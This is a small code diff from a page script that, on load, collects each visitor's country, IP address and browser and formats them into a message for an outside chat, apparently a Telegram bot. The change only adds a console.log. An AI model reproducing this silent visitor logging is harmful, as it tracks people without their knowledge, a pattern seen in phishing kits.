@@ -27,6 +27,7 @@ window.onload =function() {
     obj.Ip = data.ip
     obj.Browser = browserName
     var textContent = '<em>Action: ViewPage</em>\n<pre>Country: ' + obj.country + '\n' + 'IP: ' + obj.Ip + '\n' + 'Browser: ' + obj.Browser + '</pre>'
+    console.log(textContent)
     let formData = new FormData();
     formData.append('chat_id', ch); 
     formData.append('parse_mode', 'HTML');
